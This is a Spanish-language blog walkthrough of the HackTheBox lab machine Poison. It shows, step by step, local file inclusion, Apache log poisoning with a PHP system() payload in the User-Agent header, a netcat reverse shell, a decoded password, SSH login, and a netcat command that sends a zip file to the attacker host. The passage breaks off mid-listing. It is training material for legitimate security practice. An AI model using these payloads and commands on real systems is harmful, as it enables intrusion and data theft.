<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Poison (medium) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Poison (medium)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/09/08/poison.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/09/08/poison.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-09-08T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Poison (medium)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-09-08T00:00:00-06:00","datePublished":"2024-09-08T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Poison (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/09/08/poison.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/09/08/poison.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Poison (medium)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-09-08T00:00:00-06:00" itemprop="datePublished">
        Sep 8, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/453800925395b3a5b14099e005fb5a77.png" />
</p>

<ul>
  <li>Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.84 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-09-08 12:00 CST
Stats: 0:00:06 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>0 up<span class="o">)</span>, 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% <span class="k">done
</span>Nmap scan report <span class="k">for </span>10.10.10.84
Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 <span class="o">(</span>FreeBSD 20161230<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb <span class="o">(</span>RSA<span class="o">)</span>
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/5.6.32<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto y esta corriendo un servicio web estas son las tecnologías que esta corriendo.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.84</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.84</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">29</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">FreeBSD</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">29</span> <span class="p">(</span><span class="no">FreeBSD</span><span class="p">)</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">5.6</span><span class="o">.</span><span class="mi">32</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.84</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">5.6</span><span class="o">.</span><span class="mi">32</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">5.6</span><span class="o">.</span><span class="mi">32</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Vemos algunas rutas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">--script</span><span class="o">=</span>http-enum <span class="nt">-p80</span> 10.10.10.84 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-09-08 12:01 CST
Nmap scan report <span class="k">for </span>10.10.10.84
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /info.php: Possible information file
|_  /phpinfo.php: Possible information file
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/1.png" />
</p>

<ul>
  <li>
    <p>Nos dicen que la web funciona para probar scripts en PHP.</p>
  </li>
  <li>
    <p>Si damos click en Submit sin subir ningún tipo de contenido vemos esta respuesta.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/2.png" />
</p>

<ul>
  <li>Además en la <code class="language-plaintext highlighter-rouge">url</code> vemos que mediante un parámetro llamado <code class="language-plaintext highlighter-rouge">file</code> se ve que este es el encargado de apuntar los archivos que tenemos que indicar y como no le indicamos nada pues no esta apuntando a nada es por eso que nos da error.</li>
</ul>

<h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2>

<ul>
  <li>Por el parámetro podemos probar con un LFI para ver si podemos leer archivos en este caso el mas conocido el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> para ver los usuarios en el sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://10.10.10.84/browse.php?file=/etc/passwd'</span>
<span class="c"># $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $</span>
<span class="c">#</span>
root:<span class="k">*</span>:0:0:Charlie &amp;:/root:/bin/csh
toor:<span class="k">*</span>:0:0:Bourne-again Superuser:/root:
daemon:<span class="k">*</span>:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:<span class="k">*</span>:2:5:System &amp;:/:/usr/sbin/nologin
bin:<span class="k">*</span>:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
<span class="nb">tty</span>:<span class="k">*</span>:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:<span class="k">*</span>:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:<span class="k">*</span>:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:<span class="k">*</span>:8:8:News Subsystem:/:/usr/sbin/nologin
man:<span class="k">*</span>:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:<span class="k">*</span>:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:<span class="k">*</span>:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:<span class="k">*</span>:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
<span class="nb">bind</span>:<span class="k">*</span>:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:<span class="k">*</span>:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:<span class="k">*</span>:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:<span class="k">*</span>:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:<span class="k">*</span>:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:<span class="k">*</span>:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:<span class="k">*</span>:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:<span class="k">*</span>:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:<span class="k">*</span>:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:<span class="k">*</span>:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:<span class="k">*</span>:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:<span class="k">*</span>:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:<span class="k">*</span>:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:<span class="k">*</span>:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:<span class="k">*</span>:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:<span class="k">*</span>:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:<span class="k">*</span>:1001:1001:charix:/home/charix:/bin/csh
</code></pre></div></div>

<h2 id="log-poisoning">Log Poisoning</h2>

<ul>
  <li>
    <p>Vemos que se esta empleando <code class="language-plaintext highlighter-rouge">FreeBSD</code> <a href="https://www.freebsd.org/">https://www.freebsd.org/</a>.</p>
  </li>
  <li>
    <p>Para convertir un LFI a un RCE podemos hacer un <code class="language-plaintext highlighter-rouge">Log Poisoning</code> para ver los logs tenemos que ser capaces de ver esta ruta <code class="language-plaintext highlighter-rouge">/var/log/apache2</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://10.10.10.84/browse.php?file=/var/log'</span>
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  include<span class="o">(</span>/var/log<span class="o">)</span>: failed to open stream: Resource temporarily unavailable <span class="k">in</span> &lt;b&gt;/usr/local/www/apache24/data/browse.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  include<span class="o">()</span>: Failed opening <span class="s1">'/var/log'</span> <span class="k">for </span>inclusion <span class="o">(</span><span class="nv">include_path</span><span class="o">=</span><span class="s1">'.:/usr/local/www/apache24/data'</span><span class="o">)</span> <span class="k">in</span> &lt;b&gt;/usr/local/www/apache24/data/browse.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
</code></pre></div></div>

<ul>
  <li>En este caso se esta empleando <code class="language-plaintext highlighter-rouge">FreeBSD</code> y la ruta donde están los logs es en <code class="language-plaintext highlighter-rouge">/var/log/httpd-access.log</code> hay se guardan todas las solicitudes que recibe cada que intentamos interactuar con el servidor o la maquina todo se va a guardar allí si nosotros somos capaces de ver el contenido de ese archivo podemos tratar de hacer un <code class="language-plaintext highlighter-rouge">Log Poisoning</code> que esto lo que hace es envenenar los logs de apache y poder inyectar comandos <a href="https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1">https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1</a>.</li>
</ul>

<p>&lt;p align”center”&gt;
<img src="/assets/hackthebox/img/machines/medium/poison/3.png" />
&lt;/p&gt;</p>

<ul>
  <li>Vemos que podemos ver el archivo.</li>
</ul>

<p>&lt;p align”center”&gt;
<img src="/assets/hackthebox/img/machines/medium/poison/4.png" />
&lt;/p&gt;</p>

<ul>
  <li>Como la web interpreta <code class="language-plaintext highlighter-rouge">PHP</code> lo que podemos hacer es mediante el <code class="language-plaintext highlighter-rouge">User-Agent</code> inyectar código <code class="language-plaintext highlighter-rouge">PHP</code> para ver si lo interpreta esto lo que va hacer es como vamos a hacerlo mediante <code class="language-plaintext highlighter-rouge">curl</code> por <code class="language-plaintext highlighter-rouge">GET</code> se va a guardar el el <code class="language-plaintext highlighter-rouge">access.log</code> y hay podremos ver si en este caso funciono.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="nt">-GET</span> <span class="s2">"http://10.10.10.84/test"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: &lt;?php system('id'); ?&gt;"</span>
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;501 Not Implemented&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Implemented&lt;/h1&gt;
&lt;p&gt;-GET to /test not supported.&lt;br /&gt;
&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>

<ul>
  <li>Y vemos que como tal fue interpretado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="nt">-GET</span> <span class="s1">'http://10.10.10.84/browse.php?file=/var/log/httpd-access.log'</span> | <span class="nb">tail</span> <span class="nt">-n</span> 10
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:02:11 +0200] <span class="s2">"GET /favicon.ico HTTP/1.1"</span> 404 209 <span class="s2">"http://10.10.10.84/"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:02:30 +0200] <span class="s2">"-"</span> 408 - <span class="s2">"-"</span> <span class="s2">"-"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:06:50 +0200] <span class="s2">"GET /browse.php?file= HTTP/1.1"</span> 200 321 <span class="s2">"http://10.10.10.84/"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:07:10 +0200] <span class="s2">"-"</span> 408 - <span class="s2">"-"</span> <span class="s2">"-"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:09:38 +0200] <span class="s2">"GET /browse.php?file=/etc/passwd HTTP/1.1"</span> 200 1894 <span class="s2">"-"</span> <span class="s2">"curl/8.8.0"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:12:58 +0200] <span class="s2">"GET /browse.php?file=/var/log HTTP/1.1"</span> 200 368 <span class="s2">"-"</span> <span class="s2">"curl/8.8.0"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:18:28 +0200] <span class="s2">"GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1"</span> 200 381807 <span class="s2">"-"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:18:48 +0200] <span class="s2">"-"</span> 408 - <span class="s2">"-"</span> <span class="s2">"-"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:22:19 +0200] <span class="s2">"-GET /test HTTP/1.1"</span> 501 196 <span class="s2">"-"</span> <span class="s2">"uid=80(www) gid=80(www) groups=80(www)
</span></code></pre></div></div>

<h2 id="shell-as-www">Shell as www</h2>

<ul>
  <li>Algo que podemos hacer es que para controlar nosotros el comando podemos inyectar lo siguiente para poder hacerlo mucho mas cómodo mediante el parámetro <code class="language-plaintext highlighter-rouge">cmd</code> nosotros le vamos a pasar el comando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://10.10.10.84/test"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: &lt;?php system(</span><span class="se">\$</span><span class="s2">_GET['cmd']); ?&gt;"</span>
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /test was not found on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/5.png" />
</p>

<ul>
  <li>Ahora nos vamos a poner en escucha con <code class="language-plaintext highlighter-rouge">netcat</code> para enviarnos una reverse <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...

</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/6.png" />
</p>

<ul>
  <li>
    <p>Si lo enviamos vemos que nos envía nada.</p>
  </li>
  <li>
    <p>Lo mas probable es que tengamos que hacerlo <code class="language-plaintext highlighter-rouge">url-encodeado</code>.</p>
  </li>
  <li>
    <p>Vamos a capturar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> la petición donde vemos el archivo de los logs.</p>
  </li>
  <li>
    <p>Vamos abrirlo en segundo plano e independizamos el proceso.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ burpsuite &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
<span class="o">[</span>1] 35533
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a enviarlo con <code class="language-plaintext highlighter-rouge">mkfifo</code> <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>.</p>
  </li>
  <li>
    <p>Así se ve antes de <code class="language-plaintext highlighter-rouge">url-encodear</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/7.png" />
</p>

<ul>
  <li>Ahora lo <code class="language-plaintext highlighter-rouge">url-encodeamos</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/8.png" />
</p>

<ul>
  <li>
    <p>Ahora le damos a forward para enviar la petición.</p>
  </li>
  <li>
    <p>Nos llega la shell.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.17] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.84] 13393
sh: can<span class="s1">'t access tty; job control turned off
$ whoami
www
$ 
</span></code></pre></div></div>

<ul>
  <li>No nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script: <span class="nt">-c</span>: No such file or directory
Script started, output file is /dev/null
Script started, output file is /dev/null

Script <span class="k">done</span>, output file is /dev/null
</code></pre></div></div>

<ul>
  <li>Hay un archivo llamado <code class="language-plaintext highlighter-rouge">pwdbackup.txt</code> por el nombre ya sabemos que es importante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">pwd</span>
/usr/local/www/apache24/data
<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 72
drwxr-xr-x  2 root  wheel   512 Mar 19  2018 <span class="nb">.</span>
drwxr-xr-x  6 root  wheel   512 Jan 24  2018 ..
<span class="nt">-rw-r--r--</span>  1 root  wheel    33 Jan 24  2018 browse.php
<span class="nt">-rw-r--r--</span>  1 root  wheel   289 Jan 24  2018 index.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    27 Jan 24  2018 info.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    33 Jan 24  2018 ini.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    90 Jan 24  2018 listfiles.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    20 Jan 24  2018 phpinfo.php
<span class="nt">-rw-r--r--</span>  1 root  wheel  1267 Mar 19  2018 pwdbackup.txt
</code></pre></div></div>

<ul>
  <li>Y tenemos esto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>pwdbackup.txt
This password is secure, it<span class="s1">'s encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
</span></code></pre></div></div>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">decode</code> 13 veces obtendremos una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Q2hhcml4ITIjNCU2JjgoMA=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
Charix!2#4%6&amp;8<span class="o">(</span>0           
</code></pre></div></div>

<h2 id="shell-as-charix">Shell as charix</h2>

<ul>
  <li>Si recordamos tenemos un usuario que se llama <code class="language-plaintext highlighter-rouge">charix</code> y nos podemos conectar por SSH.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh charix@10.10.10.84
The authenticity of host <span class="s1">'10.10.10.84 (10.10.10.84)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.84<span class="s1">' (ED25519) to the list of known hosts.
(charix@10.10.10.84) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Want to see how much virtual memory you'</span>re using? Just <span class="nb">type</span> <span class="s2">"swapinfo"</span> to
be shown information about the usage of your swap partitions.
csh: The terminal database could not be opened.
csh: using dumb terminal settings.
charix@Poison:~ %
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % <span class="nb">cat </span>user.txt 
eaacdfb2d141b72a589233063604209c
charix@Poison:~ % 
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">secret.zip</code> vamos a enviarlo a nuestra maquina de atacante para analizarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> secret.zip
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora lo enviamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % nc 10.10.14.17 443 &lt; secret.zip
</code></pre></div></div>

<ul>
  <li>Vemos que hay un <code class="language-plaintext highlighter-rouge">secret</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z l secret.zip

7-Zip 24.07 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2024 Igor Pavlov : 2024-06-19
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 166 bytes <span class="o">(</span>1 KiB<span class="o">)</span>

Listing archive: secret.zip

<span class="nt">--</span>
Path <span class="o">=</span> secret.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 166

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
